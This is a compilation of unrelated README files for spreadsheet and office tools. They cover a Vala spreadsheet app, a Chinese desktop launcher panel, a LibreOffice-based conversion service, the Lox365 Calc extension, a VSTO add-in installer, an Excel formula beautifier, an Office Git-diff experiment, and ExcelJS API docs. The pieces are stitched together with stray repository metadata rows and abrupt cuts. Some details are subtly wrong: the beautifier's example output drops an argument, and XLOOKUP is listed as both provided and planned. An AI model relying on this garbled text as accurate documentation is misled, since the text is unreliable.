Spreadsheet is a spreadsheet app built with Vala and GTK, and especially for elementary OS.

![Screenshot](screen.png)

It was originally developed by [Gelez](https://github.com/elegaanz), who wrote:

> One day I was lost on the Internet, I found this great [mockup](https://www.deviantart.com/bassultra/art/Spreadsheet-363147552) of a spreadsheet app, and I decided to make it real.

The goal of this project is to build a spreadsheet app that perfectly fits in elementary OS. Only CSV files are supported at this moment.

## Building and Installation

You'll need the following dependencies:

* libgee-0.8-dev
* libgranite-dev (>= 5.4.0)
* libgtk-3-dev (>= 3.22)
* libhandy-1-dev (>= 1.2.0)
* meson (>= 0.59.0)
* valac

On elementary OS (or any distribution with `apt`), you can get them with the following command:

    sudo apt install valac libgranite-dev meson

Then clone the project and go to its root directory. Run `meson build` to configure the build environment. Change to the build directory and run `ninja` to build

    meson build --prefix=/usr
    cd build
    ninja

To install, use `ninja install`, then execute with `com.github.elework.spreadsheet`

    sudo ninja install
    com.github.elework.spreadsheet

## Contributing

There are many ways you can contribute, even if you don't know how to code.

### Reporting Bugs or Suggesting Improvements

Simply [create a new issue](https://github.com/elework/Spreadsheet/issues/new) describing your problem and how to reproduce or your suggestion. If you are not used to do, [this section](https://docs.elementary.io/contributor-guide/feedback/reporting-issues) is for you.

### Writing Some Code

Before coding, fork the project and build it as explained above.

We use Vala, as many other elementary OS apps, so it would be better if you know a bit about it, but you don't have to be an expert.

Before writing some code, let the others know on what you'll be working. The best way to do that is to go to the related issue (or create one if any related issue doesn't exist yet), and to say that you are working on it. Then start a new branch on your fork, based on `master` (and be sure master is up-to-date). You can start coding.

We follow the [coding style of elementary OS](https://docs.elementary.io/develop/writing-apps/code-style) and [its Human Interface Guidelines](https://docs.elementary.io/hig#human-interface-guidelines) in our code, please try to respect them. But there are two differences:

* We also name our namespaces after the folder they are in (e.g. `Spreadsheet.Services.Formula.AST` is in `src/Services/Formula/AST`)
* We don't put the GPL in every file, since the project is licensed under the MIT license

### Translating This App

We accept translations through Pull Requests. If you're not sure how to do, [the guideline I made](po/README.md) might be helpful.

## 操作说明

### 靠边自动唤出

默认位置是屏幕上方边缘，鼠标移到顶出现悬浮面板，鼠标离开自动隐藏。

![靠边自动唤出](screenshots/靠边自动唤出.gif)



### 调整位置和大小

悬浮面板的右键菜单中，点击“**固定**”后，面板则不会自动隐藏，可调整位置和大小。

再次点击“固定”，结束调整，继续自动隐藏。

![调整位置和大小](screenshots/调整位置和大小.gif)



### 添加文件链接

资源管理器中**拖拽文件、文件夹**进来，支持批量添加。

程序会自动获取文件图标和名字，也可手动修改。

![添加文件链接](screenshots/添加文件链接.gif)



### 快速更新文件链接

与添加一样，将资源管理器中的文件**拖拽到相应的图标上**，完成链接更新。

目前仅支持单个替换，对于无法响应的动作（例如图中的多个文件），图标将会轻微震颤。

![快速更新文件链接](screenshots/快速更新文件链接.gif)



### 添加和更新网页书签

网页书签和文件一样，在浏览器地址栏中**将网址拖入**，或者**拖到现有图标上**更新链接。

添加时，程序会自动获取网页的图标和标题。

![添加和更新网页书签](screenshots/添加和更新网页书签.gif)



### 添加图像

支持**粘贴**剪贴板的图像，自由调整大小。

![添加图像](screenshots/添加图像.gif)



### 添加分组背景

为同一类的文件/文件夹/网页添加分组，优化视觉效果。

通过**添加“矩形”**，将之“置于底层+不被选中”，可实现该功能。

![添加分组背景](screenshots/添加分组背景.gif)



### 添加装饰部件

可添加一些用于装饰的小图标，悬浮在面板上。

![添加装饰部件](screenshots/添加装饰部件.gif)



### 添加装饰背景

可添加一些透明的小图片，置于底层，作为背景装饰。

![添加装饰背景](screenshots/添加装饰背景.gif)



### 快捷键

- `Ctrl+A`：第一次全选可选中的（不包括设置“不被选中”）的部件；连续的第二次全选所有部件
- `Delete`：删除选中项
- 一些部件（比如“待办”）有自己的快捷键，右键菜单可看到



### 设置样式

绝大多数部件都可以设置CSS样式，但**并非所有部件、所有样式都可使用**，有些属性需要**重启生效**（如选择的线条），请自行测试。

以下是一些对象名字代码，在选择器中使用形如 `#IconLabel{ }` 来设置具体对象，可参考下面一些示例。

- 基础

  - ItemBase：所有部件各自的背景

    ```css
    /* 设置部件背景为白色圆角矩形 */
    #ItemBase { background: white; border-radius: 5px; margin: 3px; }
    ```

    ![自定义样式](screenshots/自定义样式_白.png)

  - SelectEdge：选中后才出现的背景，修改需重启

    ```css
    /* 设置选择框为宽度为1的红色 */
    #SelectEdge { border: 1px solid #AA0000; }
    ```
    
    ![自定义样式](screenshots/自定义样式_边.png)

- 链接

  - IconLabel：图标部分
  - TextLabel：文字部分

  ```css
  /* 设置图标背景颜色 */
  #IconLabel { background: white; border-radius: 5px; }
  ```

- 文本

  - TextEdit

    ```css
    /* 设置文字为蓝色宋体、增大、加粗、删除线 */
    #TextEdit {
        color: blue;
        font-family: 宋体;
        font-size: 30px;
        font-weight: 700;
        text-decoration:line-through;
    }
    ```
    
    ![自定义样式](screenshots/自定义样式_文.png)
    
    图中的彩色边缘样式：
    
    ```css
    #SelectEdge { background: transparent; border: 5px solid qradialgradient(spread:pad, cx:0.5, cy:0.5, radius:0.5, fx:0.5, fy:0.5, stop:0 rgba(0, 0, 0, 0), stop:0.52 rgba(0, 0, 0, 0), stop:0.565 rgba(82, 121, 76, 33), stop:0.65 rgba(159, 235, 148, 64), stop:0.721925 rgba(255, 238, 150, 129), stop:0.77 rgba(255, 128, 128, 204), stop:0.89 rgba(191, 128, 255, 64), stop:1 rgba(0, 0, 0, 0));}
    ```

- 待办

  - ListWidget：整个列表控件
  - TodoLine：每一行整体
  - TodoCheck：每一行的选择框
  - TodoEdit：每一行的编辑框

- 图像

  - ImageLabel：没必要改，只是个图片

- 矩形

  - 直接使用 ItemBase。设置样式后，将**完全替代**原本的圆角矩形
  
    ```css
    /* 一个横向渐变，如下图 */
    #ItemBase {
        background: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:0, stop:0 rgba(255, 178, 102, 64), stop:0.55 rgba(235, 148, 61, 64), stop:0.98 rgba(255, 255, 255, 64), stop:1 rgba(255, 255, 255, 0));
    	border-radius: 5px;
    	margin: 3px;
    }
    ```
    
    ![自定义样式](screenshots/自定义样式_渐.png)

EugenMayer,officeconverter,,https://github.com/EugenMayer/officeconverter,https://api.github.com/repos/officeconverter/EugenMayer,"Convert file formats like docx, xlx to other formats like pdf, png - based on jodconverter and libreoffice","[![tests](https://github.com/EugenMayer/officeconverter/actions/workflows/tests.yml/badge.svg)](https://github.com/EugenMayer/officeconverter/actions/workflows/tests.yml)
[![docker publish](https://github.com/EugenMayer/officeconverter/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/EugenMayer/officeconverter/actions/workflows/docker-publish.yml)
## WAT

Offers a (i think production ready) REST service to convert files like PDF, docx,xlx .. odt .. you get it.. to other formats like pdf, png, doc, pdt, html.
This project is basically an extended version of [jodconverter-samples-rest](https://github.com/jodconverter/jodconverter-samples/tree/main/samples/spring-boot-rest)

You can use this project as it is using docker with `ghcr.io/eugenmayer/kontextwork-converter` or build it here yourself.


## Usage

```bash
docker run --memory 512m --name converter-prod --rm -p 8080:8080 ghcr.io/eugenmayer/kontextwork-converter:production
```

Now convert a `docx` to `html`
```bash
cd officeconverter
curl -F file=@src/test/resources/testfiles/withpictures.docx ""localhost:14080/conversion?format=html"" -o /tmp/test.html
curl -F file=@src/test/resources/testfiles/template.dotx ""localhost:14080/conversion?format=html"" -o /tmp/test.html
```

## Build

local java build, when you have all the build tools present + libreoffice locally installed

    ./gradlew build
    # you find the artifact in /tmp/gradle-officeconverter/builds/libs/officeconverter-*.jar
    # the jar file is a full tomcat bundled app, so just start it like that
    java -jar /tmp/gradle-officeconverter/build/libs/officeconverter-*.jar

or better use the docker image with everything included, no dev tools/LO needed locally

```bash
# this builds the source a
make build
make start-prod
```

You can now connect to the 5001 remote debugger port, just use the existing IntelliJ task if you like

## Tests

You can run the tests locally (you will need libreoffice installed)

```bash
./gradlew itTests
```

Or in the docker-container

```bash
make test
```

## Development

You can either use the IDE task or the local gradle

    ./gradlew -Pdev bootRun

Or even better, use the development container. You will not need any LibreOffice/Gradle installed locally

     make start-src # basically just docker-compose up

This fires up a docker container, mounts your source. To auto-rebuild and auto-restart he app very quick do this

     make watch
     # or just run ./watch.sh localy

## Debugging

Of course, you can just start using your IDE and debug that, but if you want to debug inside the docker container

    make start

And now connect(attach) to localhost 5001 for debugging `ghcr.io/eugenmayer/kontextwork-converter:development` has a default remote
debugging port enabled on 5001

## REST endpoints

Check the controller to understand the different endpoints
 
-  `/conversion?format=html` as multipart with `file` as the file to convert and `format` for the target format

## Release

CI based on tags

## Configuration

You can configure the docker images by mounting `/etc/app/application.yml` and put whatever you like into them.

For example if you like to have 2 LibreOffice instances, you would put into the file

```yaml
# amount of libreOffice instances to start - one for each given port. So this means 2
jodconverter:
  local:
    port-numbers: 
      - 2002
      - 2003
    # change the tmp folder
    working-dir: /tmp
# change upload sizes
spring:
  servlet:
    multipart:
      max-file-size: 5MB
      max-request-size: 5MB
# change the server port (where the REST app is listenting)
server:
    portL: 8090
```

### Adding addition document formats

You can edit the [src/resources/document-formats.json](src/resources/document-formats.json) and add new custom formats.
The original can be found at (https://github.com/jodconverter/jodconverter/blob/master/jodconverter-core/src/main/resources/document-formats.json)[jodconverter-core].

We already added support for `dotx/xltx` for example.

## Internals

- state of the art springboot 3.0 application exposing a classic rest service to convert office document
- using [jodconverter-spring-boot-starter](https://github.com/jodconverter/jodconverter/tree/master/jodconverter-spring-boot-starter) for wiring jodconverter-local services
- build on/for Java 17 for better Docker support

## Credits

A lot of credits go to jodconverter by [jodconverter](https://github.com/jodconverter/jodconverter) - we completely base on his work. Cheer him up!

Lox365 is a LibreOffice Calc extension that adds modern spreadsheet functions like XLOOKUP, FILTER, and more.

![Screenshot](image1.png)

![Screenshot](image2.png)

Do you like using Lox365? Let me know in the [Discussions](https://github.com/goosepirate/lox365/discussions). Maybe [buy me a coffee](https://liberapay.com/goosepirate/).

<a href=""https://liberapay.com/goosepirate/donate""><img alt=""Donate using Liberapay"" src=""https://liberapay.com/assets/widgets/donate.svg""></a>

## Install or update

1. Download the extension `Lox365.oxt` from [Releases](https://github.com/goosepirate/lox365/releases).
2. Start LibreOffice > Tools > Extension Manager > Add > Select the oxt file > restart LibreOffice.

## Usage

Use the function like you would any other function in LibreOffice Calc.

### Multiple outputs

To output results in multiple cells, enter your formula with Ctrl + Shift + Enter.

This is because Lox365 functions are [array functions](https://help.libreoffice.org/latest/en-US/text/scalc/01/04060107.html). LibreOffice Calc does not support Excel's [dynamic arrays](https://support.microsoft.com/en-us/office/guidelines-and-examples-of-array-formulas-7d94a64e-3ff3-4686-9372-ecfd5caa57c7).

### Syntax

#### FILTER

Filters an array.

Similar to Excel's [FILTER](https://support.microsoft.com/en-us/office/filter-function-f4f7cb66-82eb-4767-8f7c-4877ad80c759).

![Screenshot of FILTER function](image2.png)

`=FILTER(array, include, [if_empty])`

* `array`: The array to filter.
* `include`: An array of booleans where TRUE represents a row or column to retain.
* `[if_empty]`: Returned if no items are retained. Optional.

#### IMAGE

Returns an image from a given source.

The source can be a local image file or a web URL. You can use a web URL of a third-party service to generate, for example, a QR code, equation, or diagram.

Similar to Excel's [IMAGE](https://support.microsoft.com/en-us/office/image-function-7e112975-5e52-4f2a-b9da-1d913d51f5d5).

![Screenshot of IMAGE function](image7.png)

![Screenshot of IMAGE function](image8.png)

![Screenshot of IMAGE function](image9.png)

![Screenshot of IMAGE function](image10.png)

`=IMAGE(out_cell, source)`
* `out_cell`: Reference to the cell where the image is to be placed.
* `source`: The path of the source that points to the image.

#### SORT

Sorts an array.

Similar to Excel's [SORT](https://support.microsoft.com/en-us/office/sort-function-22f63bd0-ccc8-492f-953d-c20e8e44b86c).

![Screenshot of SORT function](image3.png)

`=SORT(array, [sort_index], [sort_order])`
* `array`: The array to sort.
* `[sort_index]`: A number indicating the row or column to sort by. Optional.
* `[sort_order]`: A number indicating the desired sort order; 1 for ascending order (default), -1 for descending order. Optional.
* Not supported: `by_col`.

#### TEXTSPLIT

Splits text into columns using delimiters.

Similar to Excel's [TEXTSPLIT](https://support.microsoft.com/en-us/office/textsplit-function-b1ca414e-4c21-4ca0-b1b7-bdecace8a6e7).

![Screenshot of TEXTSPLIT function](image4.png)

`=TEXTSPLIT(text, col_delimiter)`
* `text`: The text you want to split.
* `col_delimiter`: The text that marks the point where to split the text across columns.
* Not supported: `row_delimiter`, `ignore_empty`, `match_mode`, `pad_with`.

#### TOCOL

Returns the array as one column.

Similar to Excel's [TOCOL](https://support.microsoft.com/en-us/office/tocol-function-22839d9b-0b55-4fc1-b4e6-2761f8f122ed).

![Screenshot of TOCOL function](image5.png)

`=TOCOL(array)`
* `array`: The array to return as a column.
* Not supported: `ignore`, `scan_by_column`.

#### UNIQUE

Returns the unique values from a range or array.

Similar to Excel's [UNIQUE](https://support.microsoft.com/en-us/office/unique-function-c5ab87fd-30a3-4ce9-9d1a-40204fb85e1e).

![Screenshot of UNIQUE function](image6.png)

`=UNIQUE(array)`
* `array`: The array from which to return unique rows.
* Not supported: `by_col`, `exactly_once`.

#### XLOOKUP

Searches an array for a match and returns the corresponding item from a second array.

Similar to Excel's [XLOOKUP](https://support.microsoft.com/en-us/office/xlookup-function-b7fd680e-6d10-43e6-84f9-88eae8bf5929).

![Screenshot of XLOOKUP function](image1.png)

`=XLOOKUP(lookup_value, lookup_array, return_array, [if_not_found])`
* `lookup_value`: The value to search for.
* `lookup_array`: The array to search.
* `return_array`: The array to return.
* `[if_not_found]`: Where a valid match is not found, return the [if_not_found] text you supply. Optional.
* Not supported: `match_mode`, `search_mode`.

## Why

I use these functions quite often in Excel and wanted to use them in LibreOffice too, so I made this.

## Availability of other functions

These functions are not in LibreOffice and not provided by Lox365 but are available in the latest Excel:

* RANDARRAY
* SEQUENCE
* SORTBY
* STOCKHISTORY
* TOROW
* XMATCH

These functions are not in LibreOffice Calc now, but are planned to be added:

* XLOOKUP

These functions are already available in LibreOffice:

===================

[InnoSetup][] script to install and activate Visual Studio Tools for
Office&reg; (VSTO) addins. VstoAddinInstaller makes heavy use of the
InnoSetup Preprocessor (ISPP).

Features
--------

- Installs Word&reg;, Excel&reg;, PowerPoint&reg;, or Outlook&reg;
  add-ins.
- Downloads and installs .NET and VSTO runtimes if needed.
- Checks if the target application is currently running and can
  automatically shut it down before proceeding with the installation
  process.
- Can be used with an `/UPDATE` switch to silently shut down and
  restart the target application after the installation.
- Modular structure makes it easy to keep custom configuration
  separate from the core functionality.

The script is based on the installer used by [Daniel's XL Toolbox][].


Requirements
------------

- [InnoSetup][] with InnoSetup Preprocessor; ideally you would obtain
  the InnoSetup QuickStart Pack.
- [InnoSetup Download Plugin][isdp] (takes care of downloading the
  .NET and VSTO runtime installers on the target system, if needed)
- Visual Studio with Visual Studio Tools for Office (VSTO) (included
  in the 'Professional' editions).

Some of these requirements should be fairly obvious...


Instructions for use
--------------------

VstoAddinInstaller is designed to keep itself out of your way: After
downloading and extracting the [archive][zip] (or cloning the [Git][]
repository), you should have a dedicated folder 'VstoAddinInstaller'
in your solution directory. You won't have to edit anything inside the
VstoAddinInstaller directory. A configuration file can be copied from
an example file `make-installer.dist.iss` from the `config-dist`
subdirectory to your solution's directory, where you may want to
include it in your own version control system.

A recommended folder structure is as follows:

        YourSolutionFolder
        ├── deploy                  <-- custom folder, name it whatever you like
        │   ├── make-installer.iss  <-- your custom config file for VstoAddinInstaller
        │   ├── VstoAddinInstaller  <-- VstoAddinInstaller, e.g. as Git submodule
        │   │   ├── config-dist
        │   │   │   ├── make-installer.dist.iss  <-- template for your make-installer.iss
        │   │   │   └── ...
        │   │   └── ...
        │   ├── setup-files         <-- additional files, such as a license file
        │   │   └── ...
        │   └── releases            <-- where the installer will be written to
        │       └── ...
        ├── YourProject
        │   ├── bin
        │   │   ├── Debug
        │   │   │   ├── YourProject.vsto   <-- generated by Visual Studio
        │   │   │   └── ...
        │   │   └── Release
        │   │       ├── YourProject.vsto   <-- generated by Visual Studio
        │   │       └── ...
        │   ├── YourProject.csproj
        │   └── ...
        ├── VERSION.TXT             <-- text file containing the version number (optional)
        └── ...


### Cloning as Git submodule

If you use [Git][] as your version control, you can clone the
VstoAddinInstaller respository into a submodule of your project
repository:

    git submodule add git@github.com:bovender/VstoAddinInstaller.git

You can then easily update the VstoAddinInstaller module by *changing
into the directory* and issuing

    git pull

Because the entire VstoAddinInstaller repository is contained in the
submodule, you can switch between branches and use the `develop`
branch rather than the `master` branch if you wish to do so.


### Configuring

You need to make a copy of `config-dist\make-installer.dist.iss` and
edit the contents. Ideally you would keep your copy of this file
outside the `VstoAddinInstaller` directory, as shown above, so it does
not get overwritten when you update VstoAddinInstaller.

You can rename the file to `make-installer.iss` or whatever you wish;
the `.dist` part in the original file only serves to indicate that
this is the distributed example file.

Follow along the instructions in your copy of
`make-installer.dist.iss`.

**Important**: Each installer produced with InnoSetup must have its
own global unique identifier (GUID). Please insert your own GUID where
indicated. You can generate a GUID using the corresponding command
from the `Tools` menu in InnoSetup Studio, for example.


### Compiling the installer

To compile the installer, simply run your copy of `make-installer.iss`
through InnoSetup.


### Extending

If you wish to add additional capabilities to your installer (e.g.
InnoSetup tasks), have a look in the `config-dist` directory where you
will find some example files.

Currently it is not possible to run additonal code during
initialization of setup (`InitializeSetup`) or initialization of the
wizard (`InitializeWizard`). I have been thinking about how to provide
this capability, but have not yet have the time to implement it.


Demos
-----

Demo projects are contained in the [demo](demo/) directory.

In order to try out these demo installers, you must first build the
corresponding projects in Visual Studio. The binaries are not contained
in this repository!


Further information
-------------------

For background information on the prerequisites of a VSTO add-in, see
<https://www.xltoolbox.net/blog/2015-01-30-net-vsto-add-ins-getting-prerequisites-right.html>.


Related
-------

This script is based on the related [ExcelAddinInstaller][eai].


Versioning
----------

VstoAddinInstaller is [semantically versioned][semver] using Git tags.

In short: The version number follows the scheme `MAJOR.MINOR.PATCH`.

- An increase in the `MAJOR` version number signifies API-breaking
  changes, i.e., if you decide to upgrade, you *must* adjust your local
  copy of `make-install.iss`.
- An increase in the `MINOR` version number denotes new or improved
  features. You can upgrade without adjusting your `make-install.iss`.
- The `PATCH` number is increased with bug fixes. Again, no need to edit
  your copy of `make-install.iss`.

 
Contributing
------------

You are welcome to submit pull requests for this project. I like to 
follow [Vincent Drieessen's Git branching model][nvie] where development 
takes place on the `develop` branch, and the `master` branch always 
points to the latest stable release.

Therefore, I would like to ask you to issue your pull request against 
the `develop` branch.

Excel Formula Beautifier,make Excel formulas more easy to read.

Excel公式格式化/美化,将Excel公式转为易读的排版。

## 示例：

``` Excel
=IFERROR(SUMIFS(D:D,E:E,1,F:F,""Apple"") + 1,IF(3 * A1 > 10,20,100))
↓
=IFERROR(
    SUMIFS(

        E:E,
        1,
        F:F,
        ""Apple""
    )+1,
    IF(
        3*A1>10,
        20,
        100
    )
  )
```

## Why? 起因

When we are writing a complex formula in an Excel Cell we have to face a difficulty,that is,the formula is too hard to read and it will take a lot of time for your co-worker to understand your formula,so I am going to create a way to make this thing more easier,inspired by the some SQL Beautifier Tools,I decided to develop a way to beautif Excel formula,which can easily access by webpage.

我们在编写Excel公式，特别是复杂的，带有多层if嵌套的公式，往往会显得让人难以阅读，我希望通过开发一个网页版的Excel公式格式化/美化工具来帮助大家更好地理解您或您同事写的Excel公式。

TomasHubelbauer,modern-office-git-diff,,https://github.com/TomasHubelbauer/modern-office-git-diff,https://api.github.com/repos/modern-office-git-diff/TomasHubelbauer,An experiment in tracking and diffing versions of modern Microsoft Office files in Git.,"# Modern Office Git Diff

![](https://github.com/tomashubelbauer/modern-office-git-diff/workflows/CI/badge.svg)

> An experiment in tracking and diffing versions of modern Microsoft Office files in Git.

Modern Office file formats are ZIP archives with XML files in them.
The ZIP archives are binary files so Git (and furthemore GitHub, GitLab where diff cannot be tweaked) won't display a nice diff for them.
The XML files are not binary, so in order to display a diff for these, this unpacks the ZIP files to directories that are tracked in Git.
Tracking generated files is pretty dumb, but so is tracking binary files and when forced to have one,
it's not a leap to have the other as well if it bring something useful to the table.

This is achieved using a PowerShell script which unpacks the ZIP file to a tracked directory,
formats the XML files for nice diff and tracks the formatted files as well.

> Looking for OpenOffice format support? Check out [Tim Wiel's version](https://github.com/timwiel/libreoffice2git)

**Examples:**

The XML diff captures the exact change whereas the TXT diff captures text-only change for quick content inspection.

- [Example Word diff](https://github.com/TomasHubelbauer/modern-office-xml-git/commit/3413eacaaeb236a06033a443d7979f19207a613b)
- [Example Excel diff](https://github.com/TomasHubelbauer/modern-office-xml-git/commit/5f4ef47d345ab451f17e41ebf0befbc842ff5dba)

**Features:**

- Every Office file (DOCX, XLSX, PPTS) has complementary `.git` directory with XML and TXT files for diffing
- Formatting XML files for nicer diffing
- Generating TXT files from just text nodes for lossy text-only diffing
- Warning in extracted and generated content about read-onliness of the data
- Skipping processing unchanged files for fast operation even in repos with many Office files
- Removing associated generated content automatically for Office files that have been removed from the repo
- Ability to run as a Git hook for worry free tracking

**Limitations:**

- Stores compressed *and* uncompressed versions in Git - by design, for plain text diffing and binary source of truth
- No support for DOC, XLS and PPT, only XLSX, DOCX and PPTX (XML based formats) - by design, no use diffing binary formats
- Risk of getting generated files out of sync if hook is not run or a manual edit is made to the generated files
- Won't process files uploaded to repository through GitHub/GitLab online UI (no pre-commit hook)

**Support:**

- Windows: 10.0.16299+ (`cmd -c ver`)
- Ubuntu: 16.0.0+ (`lsb-release -r`)

## Running

Run PowerShell scripts using VS Code PowerShell Integrated Console to avoid security blocks.
Open it by clicking on any `.ps1` file with integrated terminal open or running the *PowerShell: Show Integrated Console* VS Code command (`F1`+(`p`+`s`+`c`+`i`)).

- Run `cmd/version-office-files.ps1` from the command line
- Run `cmd/edit-in-powrshell-ise.ps1` to open in PowerShell ISE (Integrated Shell Environment)
- Add a Git pre-commit hook:

```sh
cp .git/hooks/pre-commit.sample .git/hooks/pre-commit
code .git/hooks/pre-commit
```

- Paste the contents of [`hook/pre-commit.sh`](hook/pre-commit.sh) into `.git/hooks/pre-commit`.

Observe commit diffs to see Office file changes in the XML and TXT files.

## Testing

Run PowerShell scripts using VS Code PowerShell Integrated Console to avoid security blocks.
Open it by clicking on any `.ps1` file with integrated terminal open or running the *PowerShell: Show Integrated Console* VS Code command (`F1`+(`p`+`s`+`c`+`i`)).

Run `cmd/run-tests.ps1` which will run NodeJS tests in [`test/` (prerequisites)](/test).

In this repository, the tests run together with the main script in a pre-commit hook in order to catch any bugs as soon as possible during development.
When using this script as a tool in a repository other than this one, only the main script would be ran as shown in the Git pre-commit hook setup code.

## Portability

Use WSL (Ubuntu) to test portability of the PowerShell script.
Use `lsb_release -a` to find WSL Ubuntu version and use
[PowerShell Linux installation instructions](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux)

## To-Do

### Document how GitHub Codespaces change the game for running this script even when editing online

Of course the basic web editor UI still won't…

### Configure Git to shut up about line endings in CI

### Upgrade Node to latest and drop MJS in favor of ESM

### See if VS Code SCM UI could be made to run the hook in PowerShell

The privileges security thing currently makes committing through VS Code fail.

## Contributing

Use [`hook/pre-commit-development.sh`](hook/pre-commit-development.sh) when
contributing to this repository to also run tests.

All of these focus on on-demand (non-tracked) generating of text-only versions of
the files, do not capture structure changes.
This project aims to explore the other, potentially less useful, but nonetheless
interesting, route of versioning both the compressed and the uncompressed forms of
a file in parallel. See the Features and Limitations sections for pros and cons.

PS: Since V4.4.2 @zurmokeeper/exceljs new cell insertion internal hyperlink support `Sheet2!A1:B1` and `A1:B1` and other forms, the original only supports `Sheet2!A1`, use the following way:：


```
const wb = new ExcelJS.Workbook();
const ws1 = wb.addWorksheet('Sheet1');
const ws2 = wb.addWorksheet('Sheet2');

'#' is required, @zurmokeeper/exceljs is to distinguish internal hyperlink by '#', the default will be considered non-internal hyperlink, older versions also need to manually add '#' , how not to add if
// internal hyperlink
ws1.getCell('A1').value = { text: 'Sheet2', hyperlink: '#Sheet2!A1' };

// internal hyperlink
ws1.getCell('A1').value = { text: 'Sheet2', hyperlink: '#Sheet2!A1:B1' };

# Contributions

Contributions are very welcome! It helps me know what features are desired or what bugs are causing the most pain.

I have just one request; If you submit a pull request for a bugfix, please add a unit-test or integration-test (in the spec folder) that catches the problem.
 Even a PR that just has a failing test is fine - I can analyse what the test is doing and fix the code from that.

Note: Please try to avoid modifying the package version in a PR.
Versions are updated on release and any change will most likely result in merge collisions.

To be clear, all contributions added to this library will be included in the library's MIT licence.

# Importing[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
const ExcelJS = require('@zurmokeeper/exceljs');
```

## ES5 Imports[⬆](#contents)<!-- Link generated with jump2header -->

To use the ES5 transpiled code, for example for node.js versions older than 10, use the dist/es5 path.

```javascript
const ExcelJS = require('exceljs/dist/es5');
```

**Note:** The ES5 build has an implicit dependency on a number of polyfills which are no longer
 explicitly added by exceljs.
 You will need to add ""core-js"" and ""regenerator-runtime"" to your dependencies and
 include the following requires in your code before the exceljs import:

```javascript
// polyfills required by exceljs
require('core-js/modules/es.promise');
require('core-js/modules/es.string.includes');
require('core-js/modules/es.object.assign');
require('core-js/modules/es.object.keys');
require('core-js/modules/es.symbol');
require('core-js/modules/es.symbol.async-iterator');
require('regenerator-runtime/runtime');

const ExcelJS = require('exceljs/dist/es5');
```

For IE 11, you'll also need a polyfill to support unicode regex patterns. For example,

```js
const rewritePattern = require('regexpu-core');
const {generateRegexpuOptions} = require('@babel/helper-create-regexp-features-plugin/lib/util');

const {RegExp} = global;
try {
  new RegExp('a', 'u');
} catch (err) {
  global.RegExp = function(pattern, flags) {
    if (flags && flags.includes('u')) {
      return new RegExp(rewritePattern(pattern, flags, generateRegexpuOptions({flags, pattern})));
    }
    return new RegExp(pattern, flags);
  };
  global.RegExp.prototype = RegExp.prototype;
}
```

## Browserify[⬆](#contents)<!-- Link generated with jump2header -->

ExcelJS publishes two browserified bundles inside the dist/ folder:

One with implicit dependencies on core-js polyfills...
```html
<script src=""https://cdnjs.cloudflare.com/ajax/libs/babel-polyfill/6.26.0/polyfill.js""></script>
<script src=""exceljs.js""></script>
```

And one without...
```html
<script src=""--your-project's-pollyfills-here--""></script>
<script src=""exceljs.bare.js""></script>
```


# Interface[⬆](#contents)<!-- Link generated with jump2header -->

## Create a Workbook[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
const workbook = new ExcelJS.Workbook();
```

## Set Workbook Properties[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
workbook.creator = 'Me';
workbook.lastModifiedBy = 'Her';
workbook.created = new Date(1985, 8, 30);
workbook.modified = new Date();
workbook.lastPrinted = new Date(2016, 9, 27);
```

```javascript
// Set workbook dates to 1904 date system
workbook.properties.date1904 = true;
```

## Set Calculation Properties[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
// Force workbook calculation on load
workbook.calcProperties.fullCalcOnLoad = true;
```

## Workbook Views[⬆](#contents)<!-- Link generated with jump2header -->

The Workbook views controls how many separate windows Excel will open when viewing the workbook.

```javascript
workbook.views = [
  {
    x: 0, y: 0, width: 10000, height: 20000,
    firstSheet: 0, activeTab: 1, visibility: 'visible'
  }
]
```

## Add a Worksheet[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
const sheet = workbook.addWorksheet('My Sheet');
```

Use the second parameter of the addWorksheet function to specify options for the worksheet.

For Example:

```javascript
// create a sheet with red tab colour
const sheet = workbook.addWorksheet('My Sheet', {properties:{tabColor:{argb:'FFC0000'}}});

// create a sheet where the grid lines are hidden
const sheet = workbook.addWorksheet('My Sheet', {views: [{showGridLines: false}]});

// create a sheet with the first row and column frozen
const sheet = workbook.addWorksheet('My Sheet', {views:[{state: 'frozen', xSplit: 1, ySplit:1}]});

// Create worksheets with headers and footers
const sheet = workbook.addWorksheet('My Sheet', {
  headerFooter:{firstHeader: ""Hello Exceljs"", firstFooter: ""Hello World""}
});

// create new sheet with pageSetup settings for A4 - landscape
const worksheet =  workbook.addWorksheet('My Sheet', {
  pageSetup:{paperSize: 9, orientation:'landscape'}
});
```

## Remove a Worksheet[⬆](#contents)<!-- Link generated with jump2header -->

Use the worksheet `id` to remove the sheet from workbook.

For Example:

```javascript
// Create a worksheet
const sheet = workbook.addWorksheet('My Sheet');

// Remove the worksheet using worksheet id
workbook.removeWorksheet(sheet.id)
```

## Access Worksheets[⬆](#contents)<!-- Link generated with jump2header -->
```javascript
// Iterate over all sheets
// Note: workbook.worksheets.forEach will still work but this is better
workbook.eachSheet(function(worksheet, sheetId) {
  // ...
});

// fetch sheet by name
const worksheet = workbook.getWorksheet('My Sheet');

// fetch sheet by id
// INFO: Be careful when using it!
// It tries to access to `worksheet.id` field. Sometimes (really very often) workbook has worksheets with id not starting from 1.
// For instance It happens when any worksheet has been deleted.
// It's much more safety when you assume that ids are random. And stop to use this function.
// If you need to access all worksheets in a loop please look to the next example.
const worksheet = workbook.getWorksheet(1);

// access by `worksheets` array:
workbook.worksheets[0]; //the first one;

```

It's important to know that `workbook.getWorksheet(1) != Workbook.worksheets[0]` and `workbook.getWorksheet(1) != Workbook.worksheets[1]`,
because `workbook.worksheets[0].id` may have any value.

## Worksheet State[⬆](#contents)<!-- Link generated with jump2header -->

```javascript
// make worksheet visible
worksheet.state = 'visible';

// make worksheet hidden
worksheet.state = 'hidden';

// make worksheet hidden from 'hide/unhide' dialog
worksheet.state = 'veryHidden';
```

## Worksheet Properties[⬆](#contents)<!-- Link generated with jump2header -->

Worksheets support a property bucket to allow control over some features of the worksheet.

```javascript
// create new sheet with properties
const worksheet = workbook.addWorksheet('sheet', {properties:{tabColor:{argb:'FF00FF00'}}});

// create a new sheet writer with properties
const worksheetWriter = workbookWriter.addWorksheet('sheet', {properties:{outlineLevelCol:1}});

